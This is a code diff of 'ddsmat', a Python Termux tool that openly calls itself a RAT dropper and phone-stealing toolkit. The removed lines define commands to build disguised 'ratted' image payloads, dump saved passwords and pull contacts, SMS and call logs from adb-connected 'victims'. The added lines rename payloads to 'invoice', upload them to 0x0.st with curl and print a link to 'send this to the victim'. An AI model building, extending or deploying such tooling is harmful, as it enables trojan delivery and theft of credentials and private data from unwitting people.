@@ -1,226 +1,116 @@
-#!/usr/bin/env python3
-# ddsmat/ddsmat.py
-"""
-ddsmat — termux RAT dropper + phone/steal toolkit.
-
-Run:  python ddsmat.py
-Then: /help
-"""
-import os
-import sys
-import shlex
-import time
-import readline  # arrow keys / history
-from pathlib import Path
-
-import adb
-import builds
-
-BASE = Path(__file__).parent
-DROPS = BASE / "drops"
-BUILDS = BASE / "builds"
-DROPS.mkdir(exist_ok=True)
-BUILDS.mkdir(exist_ok=True)
-
-BANNER = r"""
-   ___  ___  ___  __  __    _  _____
-  |   \|   \/ __|  \/  |   /_\|_   _|
-  | |) | |) \__ \ |\/| |  / _ \ | |
-  |___/|___/|___/_|  |_| /_/ \_\|_|
-
-  ddsmat — /help for commands
-"""
+def _pick_file() -> Path | None:
+    """Open Android file picker, return picked file path."""
+    tmp = Path(tempfile.gettempdir()) / f"ddsmat_pick_{int(time.time())}"
+    # try termux-api picker first
+    if shutil.which("termux-storage-get"):
+        try:
+            subprocess.run(["termux-storage-get", str(tmp)], timeout=180)
+            if tmp.exists() and tmp.stat().st_size > 0:
+                return tmp
+        except Exception:
+            pass
+    # fallback: ask for a path
+    try:
+        p = input("no picker available. path to image: ").strip()
+        if p:
+            pp = Path(p).expanduser()
+            if pp.exists():
+                return pp
+    except Exception:
+        pass
+    return None
 
 
-# ------------------------------------------------------------------
-def cmd_help(_):
-    print("""
-ddsmat commands:
-
-  /image <path> <name> [target]   build a ratted image payload
-                                  target: windows (default) | linux | android
-  /link  <file>                   print delivery options for a file
-  /steal [victim]                 dump saved passwords (adb target)
-  /phone <victim> [what]          pull contacts/sms/calls
-                                  what: all (default) | contacts | sms | calls
-  /victims                        list adb-connected devices
-  /ls                             list built payloads
-  /open <name>                    print absolute path of a built payload
-  /help                           this
-  /exit                           quit
-""")
+def _upload_0x0(path: Path) -> str:
+    """Upload to 0x0.st and return the URL. Requires `curl` (in termux by default)."""
+    try:
+        p = subprocess.run(
+            ["curl", "-s", "-F", f"file=@{path}", "https://0x0.st"],
+            capture_output=True, text=True, timeout=120,
+        )
+        url = (p.stdout or "").strip()
+        if url.startswith("http"):
+            return url
+    except Exception:
+        pass
+    return ""
 
 
 def cmd_image(args):
-    """ /image <path> <name> [target] """
-    if len(args) < 2:
-        print("usage: /image <path> <name> [windows|linux|android]")
-        return
-    src = Path(args[0]).expanduser()
-    name = args[1]
-    target = args[2] if len(args) > 2 else "windows"
+    """ /image [path] [name] [target]  — path optional, opens picker if missing """
+    src = None
+    name = "invoice"
+    target = "windows"
 
-    if not src.exists():
-        print(f"no such file: {src}")
-        return
+    # parse args flexibly
+    if args:
+        # if first arg looks like a file, use it as src
+        first = Path(args[0]).expanduser()
+        if first.exists():
+            src = first
+            if len(args) > 1: name = args[1]
+            if len(args) > 2: target = args[2]
+        else:
+            # treat as name
+            name = args[0]
+            if len(args) > 1: target = args[1]
+
+    if src is None:
+        print("[ddsmat] opening file picker …")
+        src = _pick_file()
+        if src is None:
+            print("[ddsmat] no file picked. aborting.")
+            return
+
     if target not in ("windows", "linux", "android"):
         print("target must be windows, linux, or android")
         return
 
     print(f"[ddsmat] building {target} payload from {src.name} …")
     try:
-        out, display = builds.build(src, name, target, BUILDS)
+        out, display = build(src, name, target, BUILDS)
     except Exception as e:
         print(f"[ddsmat] build failed: {e}")
         return
 
+    size_kb = out.stat().st_size / 1024
     print(f"[ddsmat] built: {out}")
-    print(f"[ddsmat] display name: {display}")
-    print(f"[ddsmat] size: {out.stat().st_size / 1024:.1f} KB")
-    print()
-    print(f"to share:  /link {out}")
-    print(f"the payload wears '{src.name}' as its icon.")
-    print(f"victim downloads '{display}' and opens it.")
+    print(f"[ddsmat] display: {display}   ({size_kb:.1f} KB)")
+
+    # try to give a link
+    print("[ddsmat] uploading …")
+    url = _upload_0x0(out)
+    if url:
+        print(f"[ddsmat] link: {url}")
+        print(f"\nsend this to the victim:")
+        print(f"   {url}")
+    else:
+        print(f"[ddsmat] upload failed (no internet or curl missing).")
+        print(f"[ddsmat] local path: {out.resolve()}")
+        print(f"[ddsmat] manual share: termux-share -a send {out}")
 
 
 def cmd_link(args):
-    if not args:
-        print("usage: /link <file>")
-        return
-    p = Path(args[0]).expanduser()
+    """ /link [file]  — if no arg, links the most recent build """
+    if args:
+        p = Path(args[0]).expanduser()
+    else:
+        files = [f for f in sorted(BUILDS.glob("*")) if f.is_file() and not f.name.startswith(".")]
+        if not files:
+            print("no builds. run /image first.")
+            return
+        p = files[-1]
+        print(f"[ddsmat] using latest build: {p.name}")
+
     if not p.exists():
         print(f"no such file: {p}")
         return
 
-    import socket
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect(("8.8.8.8", 80))
-        lan_ip = s.getsockname()[0]
-    except Exception:
-        lan_ip = "127.0.0.1"
-    finally:
-        s.close()
-
-    port = 8080
-    print(f"[ddsmat] delivery options for '{p.name}':")
-    print()
-    print("1) termux share sheet:")
-    print(f"     termux-share -a send {p}")
-    print()
-    print(f"2) local http server (same wifi only):")
-    print(f"     cd {p.parent} && python -m http.server {port}")
-    print(f"     link: http://{lan_ip}:{port}/{p.name}")
-    print()
-    print("3) upload to a host you control:")
-    print(f"     curl -F 'file=@{p}' https://0x0.st")
-
-
-def cmd_steal(args):
-    victim = args[0] if args else None
-    print(f"[ddsmat] steal{' → ' + victim if victim else ' (all adb targets)'}")
-    out = adb.steal(victim)
-    print(out)
-
-
-def cmd_phone(args):
-    if not args:
-        print("usage: /phone <victim> [all|contacts|sms|calls]")
-        return
-    victim = args[0]
-    what = args[1] if len(args) > 1 else "all"
-    print(f"[ddsmat] phone pull {victim} ({what})")
-    out = adb.phone(victim, what)
-    print(out)
-
-
-def cmd_victims(_):
-    out = adb.list_devices()
-    if not out:
-        print("no adb devices attached.")
-        print("enable USB debugging on target + connect cable, or:")
-        print("   adb connect <ip>:5555")
-        return
-    print("connected devices:")
-    for d in out:
-        print(f"  {d}")
-
-
-def cmd_ls(_):
-    files = sorted(BUILDS.glob("*"))
-    files = [f for f in files if f.is_file() and not f.name.startswith(".")]
-    if not files:
-        print("no builds yet.")
-        return
-    print(f"builds in {BUILDS}:")
-    for f in files:
-        print(f"  {f.name}  ({f.stat().st_size/1024:.1f} KB)")
-
-
-def cmd_open(args):
-    if not args:
-        print("usage: /open <name>")
-        return
-    p = BUILDS / args[0]
-    if not p.exists():
-        matches = list(BUILDS.glob(f"*{args[0]}*"))
-        if matches:
-            p = matches[0]
-        else:
-            print(f"no build matching {args[0]}")
-            return
-    print(p.resolve())
-
-
-def cmd_exit(_):
-    print("bye.")
-    sys.exit(0)
-
-
-COMMANDS = {
-    "/help":    cmd_help,
-    "/image":   cmd_image,
-    "/link":    cmd_link,
-    "/share":   cmd_link,
-    "/steal":   cmd_steal,
-    "/phone":   cmd_phone,
-    "/victims": cmd_victims,
-    "/ls":      cmd_ls,
-    "/open":    cmd_open,
-    "/exit":    cmd_exit,
-    "/quit":    cmd_exit,
-}
-
-
-# ------------------------------------------------------------------
-def main():
-    print(BANNER)
-    while True:
-        try:
-            line = input("ddsmat> ").strip()
-        except (EOFError, KeyboardInterrupt):
-            print()
-            break
-        if not line:
-            continue
-        if not line.startswith("/"):
-            if line.startswith("!"):
-                os.system(line[1:])
-                continue
-            print("commands start with '/'  (try /help)")
-            continue
-
-        parts = shlex.split(line)
-        cmd, args = parts[0], parts[1:]
-        handler = COMMANDS.get(cmd)
-        if not handler:
-            print(f"unknown: {cmd}  (try /help)")
-            continue
-        try:
-            handler(args)
-        except Exception as e:
-            print(f"[ddsmat] error: {e}")
-
-
-if __name__ == "__main__":
-    main()
+    print("[ddsmat] uploading …")
+    url = _upload_0x0(p)
+    if url:
+        print(f"[ddsmat] link: {url}")
+    else:
+        print(f"[ddsmat] upload failed.")
+        print(f"[ddsmat] local: {p.resolve()}")
+        print(f"[ddsmat] share: termux-share -a send {p}")
